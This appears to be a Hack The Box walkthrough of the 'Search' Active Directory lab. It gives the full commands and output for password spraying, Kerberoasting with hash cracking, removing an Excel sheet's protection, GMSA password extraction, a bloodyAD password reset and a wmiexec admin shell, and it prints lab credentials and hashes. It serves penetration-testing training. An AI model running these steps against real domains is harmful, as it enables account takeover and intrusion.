---
categories:
- Hackthebox
image:
  path: search.png
layout: post
media_subpath: /assets/images/search
tags:
- hackthebox
- writeup
- windows
- active-directory
- kerberoasting
- excel-bypass
- gmsa
- bloodyad
- genericall
- bloodhound
- hard
title: HTB - Search Walkthrough
---


## Introduction

Search is a hard-difficulty Windows domain controller that demonstrates multiple Active Directory attack techniques including hidden credential discovery in images, Kerberoasting, Excel spreadsheet protection bypass via ZIP manipulation, GMSA password extraction, and privilege escalation through GenericAll abuse.

## Reconnaissance
### Port Scanning
Initial `nmap` scan reveals a Windows domain controller with standard AD services:

```
nmap -sC -sV -oA nmap/search 10.10.11.129      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 21:38 EAT
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 96.55% done; ETC: 21:38 (0:00:01 remaining)
Nmap scan report for 10.10.11.129
Host is up (0.41s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-09 18:39:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2025-08-09T18:40:51+00:00; +28s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2025-08-09T18:40:50+00:00; +28s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2025-08-09T18:40:50+00:00; +28s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-09T18:40:50+00:00; +27s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2025-08-09T18:40:50+00:00; +28s from scanner time.
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 27s, deviation: 0s, median: 27s
| smb2-time: 
|   date: 2025-08-09T18:40:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.75 seconds
```
**Key Findings:**

- Domain: `search.htb`
- Hostname: `research.search.htb`
- IIS web server on ports 80 and 443
- Active Directory Certificate Services (port 443 with cert)

Add domain to hosts file:
```
echo '10.10.11.129  research.search.htb search.htb' | sudo tee -a /etc/hosts
```

## Web Enumeration

### Initial Website

Visiting the website reveals a corporate page for "Search" company:

![img](Pasted image 20250810115429.png)

### Employee Directory Discovery

Scrolling through the website reveals a list of employees:

![img](Pasted image 20250810120652.png)

**Employees Found:**

- Keely Lyons
- Dax Santiago
- Sierra Frye
- Kyla Stewart
- Kaiara Spencer
- Dave Simpson
- Ben Thompson
- Chris Stewart
- Hope Sharp

### Hidden Image Discovery

Further inspection reveals a hidden image containing credentials:

![img](Pasted image 20250810122841.png)

**Credentials Found:** `Hope Sharp : IsolationIsKey?`

## User Enumeration
### Generating Username Variations

Using `username-anarchy` to generate possible username formats:

```
cat users.tmp 
Keely Lyons
Dax Santiago
Sierra Frye
Kyla Stewart
Kaiara Spencer
Dave Simpson
Ben Thompson
Chris Stewart
Hope Sharp

usernamegen -u users.tmp -o potential_usernames
 
rm: cannot remove 'potential_usernames': No such file or directory
Usernames Generated Successfully
```
### Validating Users with Kerbrute

```
kerbrute userenum potential_usernames --dc 10.10.11.129 -d search.htb 
<.....SNIP.....>
2025/08/10 12:33:54 >  [+] VALID USERNAME:       keely.lyons@search.htb
2025/08/10 12:33:54 >  [+] VALID USERNAME:       dax.santiago@search.htb
2025/08/10 12:33:54 >  [+] VALID USERNAME:       sierra.frye@search.htb
2025/08/10 12:33:56 >  [+] VALID USERNAME:       hope.sharp@search.htb
2025/08/10 12:34:02 >  Done! Tested 99 usernames (4 valid) in 8.389 seconds
```

**Valid Users:**

- `keely.lyons@search.htb`
- `dax.santiago@search.htb`
- `sierra.frye@search.htb`
- `hope.sharp@search.htb`

### Password Spray Attempt

Testing username as password (common misconfiguration):

```
kerbrute passwordspray  --user-as-pass valid_users --dc 10.10.11.129 -d search.htb
<.....SNIP....>
2025/08/10 12:36:43 >  Using KDC(s):
2025/08/10 12:36:43 >   10.10.11.129:88

2025/08/10 12:36:43 >  Done! Tested 4 logins (0 successes) in 0.765 seconds
```

**Result:** No successes.
### AS-REP Roasting Check

```
impacket-GetNPUsers -no-pass search.htb/ -usersfile valid_users -dc-ip 10.10.11.129                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User keely.lyons doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dax.santiago doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sierra.frye doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hope.sharp doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Result:** No users have `UF_DONT_REQUIRE_PREAUTH` set.

### Successful Password Spray

Using the discovered password from the hidden image:

```
kerbrute passwordspray -d search.htb --dc 10.10.11.129 valid_users 'IsolationIsKey?'
<....SNIP....>
2025/08/10 12:47:35 >  [+] VALID LOGIN:  hope.sharp@search.htb:IsolationIsKey?
2025/08/10 12:47:35 >  Done! Tested 4 logins (1 successes) in 1.388 second
```
## SMB Enumeration as hope.sharp

### Share Discovery

```
nxc smb 10.10.11.129 -u hope.sharp -p 'IsolationIsKey?' --shares     
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
SMB         10.10.11.129    445    RESEARCH         [*] Enumerated shares
SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$                              Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk                        
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share 
```

**Non-Default Shares:**

- `CertEnroll` (READ) - AD Certificate Services
- `helpdesk` (no access)
- `RedirectedFolders$` (READ, WRITE) - Folder redirection for user profiles

### RedirectedFolders$ Analysis

This share contains home folders for domain users:

```
smbclient -U 'hope.sharp%IsolationIsKey?' //10.10.11.129/'RedirectedFolders$'   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  Dc        0  Sun Aug 10 18:45:45 2025
  ..                                 Dc        0  Sun Aug 10 18:45:45 2025
  abril.suarez                       Dc        0  Tue Apr  7 21:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 16:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 15:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 21:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 15:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 21:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 16:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 15:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 21:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 14:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 23:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 15:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 21:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 21:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 17:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 21:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 16:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 23:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 14:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 21:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 15:21:42 2020
  sierra.frye                        Dc        0  Thu Nov 18 04:01:46 2021
  trace.ryan                         Dc        0  Thu Apr  9 23:14:26 2020

                3246079 blocks of size 4096. 759479 blocks available
smb: \> 
```

Only `hope.sharp`'s folder is accessible, with no interesting files.

## Kerberoasting Attack

### Extracting TGS for Service Accounts

```
nxc ldap 10.10.11.129 -u hope.sharp -p 'IsolationIsKey?' --kerberoasting valid_users 
LDAP        10.10.11.129    389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb)
LDAP        10.10.11.129    389    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
LDAP        10.10.11.129    389    RESEARCH         [*] Skipping disabled account: krbtgt
LDAP        10.10.11.129    389    RESEARCH         [*] Total of records returned 1
LDAP        10.10.11.129    389    RESEARCH         [*] sAMAccountName: web_svc, memberOf: [], pwdLastSet: 2020-04-09 15:59:11.329031, lastLogon: <never>
LDAP        10.10.11.129    389    RESEARCH         $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb\web_svc*$b3279b7d08b1c8065eb1f7b78bcc7e8f$891cba23f48df485a6efedf44c3b33a9a47a2ac020583e2ae8a11529df3ed4e9eaf9064b2ff033b93badb19705d73be8550c466d1ccce2e8ed447b8323ad8a45f59a9b1bd2569aaf2b43179b8338e6b36a03d7f0906c90dfa159ee819bc84a67447815e19229cfda5d3daf10a16c4d290c04e13a92ef1f3983fe0398df328680c1bacc788e62b69d8a451038868b998a1446d35d2b8fca641eca9214511229ad384945bab0991de49b9b73a55a966a84f23ea0495402e3d780df622ed196e1edff2e974e210362a50451f128d9ea7b3cfb92c665b783597cb30fc547b64afaf2dffead9639878ac2c5dfd746b44e035400862830550cfac5ce29da01883e2575fdf9a2861041a0bd5ea568281d16b958df138f4c28c40dc5910a6a6625a494007b701b963dc16caba5b58f19755bff3335aedd9ec34acb10f67b30b1d199263bbc2de9930d9732e8f7f400dd267eab1b612c3c460c1d55c2a05ae9293a130aa1c3db9483f93cb29eef71c77486872721f87c6e1c0592e33f1a4fa8fd580bd7c90d2ff35e93f937ac4ba3583bca61a34bc958a295f8eb9b78b36f3a5fcf379b17d8d5ecef2a5fecaae6445da0745dcf1d79f844983fff9f15bf764bc1af6be1ba90fb1bee1a548b5bffd243a0420516a93e019cec0c2eae8fa134dfac98f9f8a4d5116af044e24fe9a7241789f5b6a2cccbeb59920e331356d12f797dfa4265da62aa00bb3b3fbc576b4770346a764b623a99a0f844b0df8aa2c00e7a99af646c8705bbd3679b8418a1a85d46edb02380f67fb65c039e66a3e965ed0be0e11417ea6cd4636a9f1b3bea46297de4ec04a83cc99ddfff68a108d92d46d563a9ea4898edca7e95066a02748140d38586b74014dbd4e1ecf968bb3419de9728de12f447eb4ea647a4820ad81adf7ffcd0c4b2bb58dae561a2556fc0c14d544d5021c633e1ae803768c0debedfb7f4514fe785fed809a6831809135d2920919c5e966c1f67dadba9de320b44ffbd44d77dc6b685e61ba16e6d7de09293b6a2ded831c39ss7e861f95b79be113d44ef7c3cfaec0756ee79a03da1d502a6b353cf50e0e9ac576f042dd19e8d262809e269fdfacaac128fb8a11cdb247ab4c9a815dbef7ddf4e970b176c3acae7a66c99b20171f329974793fd923602d70c70fcd896f82a7dcfe3fb274c5cd613a341574380a6053e52126a15b32543dc92345878f891531fd25dada1880f51b0401afce37173363bd58a15e8154897f460b71f6a00ecdc959e87ee1a672a20dc66413991dd4c451a4b986f8af966cc2d854ed25b7d48a435ecd100658b25fc6bfcb3670c56c6f7d0f1f09edd1148808c311dc20b7b3753d2987eca589fb7153f191c789c9051bb411d5205bb63f20ac3732ea24d4f4f48de15a57b034417be16b1f517fa16d3d8b4a3606f25a0426536938d75021aba5ecc8385c8e3f059bdba8fc177d667ade32ab7795f32e4
```

**Vulnerable Account Found:** `web_svc` has an SPN set!

### Cracking the Hash

```
hashcat web_svc.hash /usr/share/wordlists/rockyou.txt
<....SNIP....>
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb\web_svc*$b3279b7d08b1c8065eb1f7b78bcc7e8f$891cba23f48df485a6efedf44c3b33a9a47a2ac020583e2ae8a11529df3ed4e9eaf9064b2ff033b93badb19705d73be8550c466d1ccce2e8ed447b8323ad8a45f59a9b1bd2569aaf2b43179b8338e6b36a03d7f0906c90dfa159ee819bc84a67447815e19229cfda5d3daf10a16c4d290c04e13a92ef1f3983fe0398df328680c1bacc788e62b69d8a451038868b998a1446d35d2b8fca641eca9214511229ad384945bab0991de49b9b73a55a966a84f23ea0495402e3d780df622ed196e1edff2e974e210362a50451f128d9ea7b3cfb92c665b783597cb30fc547b64afaf2dffead9639878ac2c5dfd746b44e035400862830550cfac5ce29da01883e2575fdf9a2861041a0bd5ea568281d16b958df138f4c28c40dc5910a6a6625a494007b701b963dc16caba5b58f19755bff3335aedd9ec34acb10f67b30b1d199263bbc2de9930d9732e8f7f400dd267eab1b612c3c460c1d55c2a05ae9293a130aa1c3db9483f93cb29eef71c77486872721f87c6e1c0592e33f1a4fa8fd580bd7c90d2ff35e93f937ac4ba3583bca61a34bc958a295f8eb9b78b36f3a5fcf379b17d8d5ecef2a5fecaae6445da0745dcf1d79f844983fff9f15bf764bc1af6be1ba90fb1bee1a548b5bffd243a0420516a93e019cec0c2eae8fa134dfac98f9f8a4d5116af044e24fe9a7241789f5b6a2cccbeb59920e331356d12f797dfa4265da62aa00bb3b3fbc576b4770346a764b623a99a0f844b0df8aa2c00e7a99af646c8705bbd3679b8418a1a85d46edb02380f67fb65c039e66a3e965ed0be0e11417ea6cd4636a9f1b3bea46297de4ec04a83cc99ddfff68a108d92d46d563a9ea4898edca7e95066a02748140d38586b74014dbd4e1ecf968bb3419de9728de12f447eb4ea647a4820ad81adf7ffcd0c4b2bb58dae561a2556fc0c14d544d5021c633e1ae803768c0debedfb7f4514fe785fed809a6831809135d2920919c5e966c1f67dadba9de320b44ffbd44d77dc6b685e61ba16e6d7de09293b6a2ded831c397e861f95b79be113d44ef7c3cfaec0756ee79a03da1d502a6b353cf50e0e9ac576f042dd19e8d262809e269fdfacaac128fb8a11cdb247ab4c9a815dbef7ddf4e970b176c3acae7a66c99b20171f329974793fd923602d70c70fcd896f82a7dcfe3fb274c5cd613a341574380a6053e52126a15b32543dc92345878f891531fd25dada1880f51b0401afce37173363bd58a15e8154897f460b71f6a00ecdc959e87ee1a672a20dc66413991dd4c451a4b986f8af966cc2d854ed25b7d48a435ecd100658b25fc6bfcb3670c56c6f7d0f1f09edd1148808c311dc20b7b3753d2987eca589fb7153f191c789c9051bb411d5205bb63f20ac3732ea24d4f4f48de15a57b034417be16b1f517fa16d3d8b4a3606f25a0426536938d75021aba5ecc8385c8e3f059bdba8fc177d667ade32ab7795f32e4:@3ONEmillionbaby
```

**Cracked Password:** `@3ONEmillionbaby`

### Password Spray with web_svc Password

```
kerbrute passwordspray -d search.htb --dc 10.10.11.129 valid_users '@3ONEmillionbaby' 
<...SNIP...>
2025/08/10 19:11:07 >  [+] VALID LOGIN:  Edgar.Jacobs@search.htb:@3ONEmillionbaby
2025/08/10 19:11:20 >  [+] VALID LOGIN:  web_svc@search.htb:@3ONEmillionbaby
2025/08/10 19:11:20 >  Done! Tested 107 logins (2 successes) in 18.257 seconds
```

**Additional Valid Login:** `Edgar.Jacobs@search.htb:@3ONEmillionbaby`

```
nxc smb 10.10.11.129 -u edgar.jacobs -p '@3ONEmillionbaby'  --shares
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby 
SMB         10.10.11.129    445    RESEARCH         [*] Enumerated shares
SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$                              Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk        READ            
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share 

```
**New Access:** `helpdesk` share (READ) - previously inaccessible.

The share appears empty initially.

### Interesting Document Discovery

In `edgar.jacobs` folder at `RedirectedFolders$`:

```
smbclient -U 'edgar.jacobs%@3ONEmillionbaby' //10.10.11.129/'RedirectedFolders$'
Try "help" to get a list of possible commands.
smb: \> 
<...SNIP....>
smb: \edgar.jacobs\Desktop\> ls
  .                                 DRc        0  Mon Aug 10 13:02:16 2020
  ..                                DRc        0  Mon Aug 10 13:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 23:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 13:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 23:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 13:35:44 2020

                3246079 blocks of size 4096. 757998 blocks available
smb: \edgar.jacobs\Desktop\> get Phishing_Attempt.xlsx
getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as Phishing_Attempt.xlsx (17.5 KiloBytes/sec) (average 17.5 KiloBytes/sec)
smb: \edgar.jacobs\Desktop\> 
```

Opening the document I notice 2 odd things. First column C is hidden and requires a password encrypted. Also I notice that its the 2nd sheet in the worksheet.

![img](Pasted image 20250810193305.png)

## Excel Sheet Protection Bypass

### Technical Concept: Excel Sheet Protection

Excel files (`.xlsx`) are actually ZIP archives containing XML files. Sheet protection is implemented via a `<sheetProtection>` element in the worksheet XML. By removing this element, we can bypass password protection entirely - no cracking required!

### Step-by-Step Bypass

**1. Unzip the Excel file:**

```
unzip Phishing_Attempt.xlsx 
<....SNIP....>
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/worksheets/sheet2.xml
  <...SNIP...>
```

**2. Locate the protected sheet (sheet2.xml):**

```
xl/worksheets/sheet1.xml
xl/worksheets/sheet2.xml   # This one is protected
```

**3. Examine the protection element:**

```
<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
```

**4. Remove the protection element** (delete the entire line)

**5. Re-zip the contents:**

```
zip phising.zip -r .
 <...SNIP...>
mv phising.zip phising.xlsx 
```

**6. Open the modified file** - the hidden column C is now visible!

### Extracted Credentials

The spreadsheet contains usernames and passwords in column C:

![img](Pasted image 20250810212341.png)
## Lateral Movement - Sierra.Frye

### Password Spray with Extracted Credentials

```
nxc smb 10.10.11.129 -u usernames.txt -p passwords.txt --no-brute --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
<...SNIP...>
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
<...SNIP....>
```
### User Flag

```
smbclient -U 'Sierra.Frye%$$49=wide=STRAIGHT=jordan=28$$18' //10.10.11.129/'RedirectedFolders$'
Try "help" to get a list of possible commands.
smb: \> cd sierra.frye/Desktop
smb: \sierra.frye\Desktop\>get user.txt
```

**User flag acquired.**

## Privilege Escalation

### BloodHound Analysis

Collecting AD data:

```
bloodhound-python -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -ns 10.10.11.129 -d search.htb -c All --zip
<...SNIP...>
INFO: Done in 03M 02S
INFO: Compressing output into 20250810213408_bloodhound.zip
```

![img](Pasted image 20250810214402.png)
**Attack Path Identified:**

1. `Sierra.Frye` can read GMSA password for `BIR-ADFS-GMSA$`
2. `BIR-ADFS-GMSA$` has GenericAll on `TRISTAN.DAVIES`
3. `TRISTAN.DAVIES` has administrative privileges (Pwn3d! flag)

### GMSA Password Extraction

```
nxc ldap 10.10.11.129 -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' --gmsa
LDAP        10.10.11.129    389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb)
LDAPS       10.10.11.129    636    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
LDAPS       10.10.11.129    636    RESEARCH         [*] Getting GMSA Passwords
LDAPS       10.10.11.129    636    RESEARCH         Account: BIR-ADFS-GMSA$       NTLM: e1e9fd9e46d0d747e1595167eedcec0f     PrincipalsAllowedToReadPassword: ITSec
```
### Granting GenericAll with bloodyAD

```
bloodyAD -u 'BIR-ADFS-GMSA$' -p ':e1e9fd9e46d0d747e1595167eedcec0f' -d search.htb --dc-ip 10.10.11.129 add genericAll TRISTAN.DAVIES 'BIR-ADFS-GMSA$' 
[+] BIR-ADFS-GMSA$ has now GenericAll on TRISTAN.DAVIES
```
### Changing Target User's Password

```
bloodyAD -u 'BIR-ADFS-GMSA$' -p ':e1e9fd9e46d0d747e1595167eedcec0f' -d search.htb --dc-ip 10.10.11.129 set password TRISTAN.DAVIES 'Pass!@#'
[+] Password changed successfully!
```
### Verifying Administrative Access

```
nxc smb 10.10.11.129 -u TRISTAN.DAVIES -p 'Pass!@#' 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\TRISTAN.DAVIES:Pass!@# (Pwn3d!)
```

The `(Pwn3d!)` flag indicates this user has administrative privileges (likely Domain Admin).

### System Shell

```
impacket-wmiexec search.htb/TRISTAN.DAVIES:'Pass!@#'@10.10.11.129
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

**Root flag:** `C:\Users\Administrator\Desktop\root.txt`











